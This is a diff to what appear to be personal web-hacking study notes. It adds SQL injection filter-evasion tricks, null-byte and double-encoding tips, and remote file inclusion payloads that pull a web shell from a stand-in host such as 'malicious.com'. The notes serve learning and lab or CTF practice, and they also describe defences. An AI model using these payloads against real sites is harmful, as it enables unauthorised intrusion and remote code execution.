@@ -1,4 +1,4 @@
-http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D%252E%252E%252Findex%252Ephp%2500
+https://blog.cloudflare.com/the-joomla-unserialize-vulnerability/
 
 -------------------
 Attacking strategies:
@@ -108,7 +108,8 @@ For example, for phpbb, that might be /phpbb3/install/install.php
 [+]If you find a .git directory, then check this out: https://lab.pentestit.ru/docs/TL8_WU_en.pdf
 
 [+] Joomla: Check out joomscan https://www.owasp.org/index.php/OWASP_Joomla_Vulnerability_Scanner_Usage
-	 Wordpress: wpscan
+	 Wordpress: wpscan, might also want to check out wordpress sploit framework
+	 CMS: Check out cmsmap
 --------------------------------------------------------
 Attacking web login applications/authentication methods
 --------------------------------------------------------
@@ -224,6 +225,21 @@ SELECT concat(table_name,':', column_name) FROM information_schema.columns
 
 [+] SQLmap tutorial - http://www.binarytides.com/sqlmap-hacking-tutorial/
 frst thing to try - sqlmap -u "mysite.com/sql.php?param=1"
+
+[+] Filter evasion:
+Advanced ways to evade filters (using tricks like putting backslashes, using MySQL syntax, etc):
+https://websec.files.wordpress.com/2010/11/sqli2.pdf
+SQL smuggling for evading filters: 
+if "INSERT" is blacklisted, then do concat("INS", "ERT"). Also UNICODE smuggling: 'Ā' defaults to 'A' and won't be detected.
+starts from like halfway into the document.
+
+[+] Fixes: 
+Blacklisting is bad. Almost all blacklists can be penetrated using filter evasion techniques.
+Whitelisting is better.
+Prepared statements/Parameter binding (same thing) is the way to go. Makes it impossible to do SQLi
+(unless it's incorrectly setup). You have to make sure that attackers can't change the command
+from neither the query itself or when you get data from the database that they might have 
+changed (which is called second-order injection or something)
 ---------------
 File upload vulns
 ---------------
@@ -284,9 +300,10 @@ the GET request and then includes language/$lang.php.
 https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
 
 [+] Putting a null-byte in between a string *might* make the string stop in some commands, for example in includes (because that's how it works in C). 
-For example, include("shell.php\0.img") and will try to include "shell.php". 
+For example, include("shell.php\0.img") and will try to include "shell.php". In URL encoding, the NULL byte is %00.
 Doesn't work since PHP 5.3.4 (preg_ functions should still be vulnerable)
 If you try to do it after PHP 5.3.4, then it simply won't open anything with a null byte in it (even if you put the byte after the correct filename)
+From my server: Failed opening 'http://www.maribell.ee' for inclusion, when the url is ?lang=http://www.maribell.ee%00.whatever
 
 [+] Double encoding:
 If there's an attack detection system in place, then if there's also a decode() before the include()
@@ -297,15 +314,19 @@ It might occur when the dev is dumb or when there's some kind of third party app
 which does the decode.
 
 [+] Remote file inclusion - how to pass any extension or suffix to the URL (like "google.com/.php") without errors:
-You can try to include Google's homepage by using the accessing URL: http://vulnerable/index.php?page=http://www.google.com/?
-The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by Google's servers as a parameter. If the configuration of the vulnerable system doesn't allow remote file include, an error message is displayed.
+If the include() script adds something like _lang.php or whatever at the end of it, then you don't need to 
+make the file end with _lang.php on the remote server. You can just put a "?" at the end of your include.
+?include=http://malicious.com/shell.txt?_lang.php
+The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by as a GET parameter. If the configuration of the vulnerable system doesn't allow remote file include, an error message is displayed.
 
-[+] Exploitation of RFI - how to make it so that the PHP code is passed to the vulnerable system, 
-not the result of visiting the .php site:
+[+] Exploitation of RFI:
 https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
 Under "exploitation of remote file include"
 
-From DVWA:
+When you include a web shell, you should include shell.txt, not shell.php. 
+If you include a php file, then the code runs on the external server, not yours.
+
+[+] DVWA Remote File Include:
 Low - ?page=http://evil.com
 Medium - use some other filestream, like php://. Info at https://secure.php.net/manual/en/wrappers.php
 
@@ -543,3 +564,8 @@ if (!strcmp([], "testpassword")) {
 	echo "password bypassed";
 }
 	
+	
+-------------------------------
+Server-Side Template inclusion
+--------------------------------
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf
